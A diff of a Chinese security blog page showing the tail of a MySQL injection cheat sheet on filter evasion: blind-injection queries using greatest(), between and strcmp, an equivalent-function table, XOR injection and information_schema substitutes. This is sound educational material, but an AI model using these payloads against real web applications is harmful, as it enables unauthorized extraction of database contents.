+<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值<br>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and greatest(ascii(substr(database(),0,1)),64)&#x3D;64</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gr1au2dkhsj30nm06qt8z.jpg" alt="QQ截图20210531082158"></p>
+<p>看上面的截取，第一位和第二位显示。</p>
+<p><strong>使用between a and b ：范围在a-b之间</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and (ascii(substr(database(),1,1))) between 1 and 190;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用strcmp(str1,str2)</strong></p>
+<blockquote>
+<p>若所有的字符串均相同，则返回<code>STRCMP()</code>，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</p>
+</blockquote>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gr1cfj1sn7j30tf07dq4x.jpg" alt="QQ截图20210531091711"></p>
+<h3 id="7-等价函数变量饶过"><a href="#7-等价函数变量饶过" class="headerlink" title="7)等价函数变量饶过"></a>7)等价函数变量饶过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.hex()、bin() &#x3D;&#x3D;&gt; ascii()</span><br><span class="line"></span><br><span class="line">2.sleep() &#x3D;&#x3D;&gt;benchmark()</span><br><span class="line"></span><br><span class="line">3.concat_ws()&#x3D;&#x3D;&gt;group_concat()</span><br><span class="line"></span><br><span class="line">4.mid()、substr() &#x3D;&#x3D;&gt; substring()</span><br><span class="line"></span><br><span class="line">5.@@user &#x3D;&#x3D;&gt; user()</span><br><span class="line"></span><br><span class="line">6.@@datadir &#x3D;&#x3D;&gt; datadir()</span><br><span class="line"></span><br><span class="line">7.@@version &#x3D;&#x3D;&gt; version()</span><br><span class="line"></span><br><span class="line">8.&amp;&amp;&#x3D;&#x3D;&gt;and</span><br><span class="line"></span><br><span class="line">9.||&#x3D;&#x3D;&gt;or</span><br><span class="line"></span><br><span class="line">10.|&#x3D;&#x3D;&gt;xor</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-异或注入"><a href="#8-异或注入" class="headerlink" title="8)异或注入"></a>8)异或注入</h3><blockquote>
+<p>在and,or ,|,&amp;&amp;,||等符号被过滤的情况下，可以采用异或注入达到注入的目的。</p>
+</blockquote>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gr1ft5dvypj30z506omxd.jpg" alt="QQ截图20210531111402"></p>
+<p>1^1=0    1^0=0 其他的自己测。数据库select 1^0;就可以</p>
+<h3 id="9-information-schema被过滤"><a href="#9-information-schema被过滤" class="headerlink" title="9)information_schema被过滤"></a>9)<strong>information_schema被过滤</strong></h3><blockquote>
+<p>innodb引擎可用mysql.innodb_table_stats、innodb_index_stats，日志将会把表、键的信息记录到这两个表中除此之外，系统表sys.schema_table_statistics_with_buffer、sys.schema_auto_increment_columns用于记录查询的缓存，某些情况下可代替information_schema</p>
+<p>JOin也是可以的。</p>
+</blockquote>
+<p>推荐：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7169#toc-20">https://xz.aliyun.com/t/7169#toc-20</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vdUoQU2WS7zf0EKHFYKNvg">https://mp.weixin.qq.com/s/vdUoQU2WS7zf0EKHFYKNvg</a></p>
+<p>骚姿势:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5505">https://xz.aliyun.com/t/5505</a></p>
 
     </article>
     <!-- license  -->
@@ -482,11 +583,11 @@ height:50vh;
                 Author：<a href="http://example.com">
                         R0ser1
                     </a>
-                    <p>发表日期：<a href="http://example.com/2021/05/03/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">
-                            May 3rd 2021, 10:48:00 pm
+                    <p>发表日期：<a href="http://example.com/2021/07/17/Mysql%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E5%A4%87%E5%BF%98%E5%BD%95/">
+                            July 17th 2021, 9:47:00 pm
                         </a>
-                    <p>更新日期：<a href="http://example.com/2021/05/03/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">
-                            July 17th 2021, 5:30:47 pm
+                    <p>更新日期：<a href="http://example.com/2021/07/17/Mysql%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E5%A4%87%E5%BF%98%E5%BD%95/">
+                            July 17th 2021, 9:47:55 pm
                         </a>
                     <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可
                     </p>
@@ -496,20 +597,13 @@ height:50vh;
             <ul class="post-paginator">
                 <li class="next">
                     
-                        <div class="nextSlogan">Next Post</div>
-                        <a href="/2021/05/11/Mysql%E4%B8%80%E4%BA%9B%E5%A4%87%E5%BF%98%E5%BD%95/" title="Mysql注入一些备忘录">
-                            <div class="nextTitle">
-                                Mysql注入一些备忘录
-                            </div>
-                        </a>
-                        
                 </li>
                 <li class="previous">
                     
                         <div class="prevSlogan">Previous Post</div>
-                        <a href="/2021/03/21/Meterpreter%E5%90%8E%E6%B8%97%E9%80%8F/" title="Meterpreter后渗透">
+                        <a href="/2021/07/17/Tryhackme%E8%AE%B0%E5%BD%95liunx%E6%8F%90%E6%9D%83/" title="Tryhackme记录liunx提权">
                             <div class="prevTitle">
-                                Meterpreter后渗透
+                                Tryhackme记录liunx提权
                             </div>
                         </a>
                         
@@ -624,7 +718,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MYSQL%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7"><span class="toc-number">1.</span> <span class="toc-text">MYSQL一些技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-%E5%9F%BA%E7%A1%80%E9%A5%B6%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">0)基础饶过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.2.</span> <span class="toc-text">1)过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">2)过滤单引号：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">1.4.</span> <span class="toc-text">3)过滤注释符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7"><span class="toc-number">1.5.</span> <span class="toc-text">4)过滤逗号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%BF%87%E6%BB%A4%E7%AD%89%E5%8F%B7"><span class="toc-number">1.6.</span> <span class="toc-text">5)过滤等号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%BF%87%E6%BB%A4%E8%BF%87%E6%BB%A4%E6%AF%94%E8%BE%83%E7%AC%A6%E5%8F%B7-%EF%BC%88-lt-%E5%92%8C-gt-%EF%BC%89"><span class="toc-number">1.7.</span> <span class="toc-text">6)过滤过滤比较符号 （ &lt; 和 &gt; ）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0%E5%8F%98%E9%87%8F%E9%A5%B6%E8%BF%87"><span class="toc-number">1.8.</span> <span class="toc-text">7)等价函数变量饶过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5"><span class="toc-number">1.9.</span> <span class="toc-text">8)异或注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-information-schema%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">1.10.</span> <span class="toc-text">9)information_schema被过滤</span></a></li></ol></li></ol>
     </div>
     
     <div class="sidebar sidebar-hide">
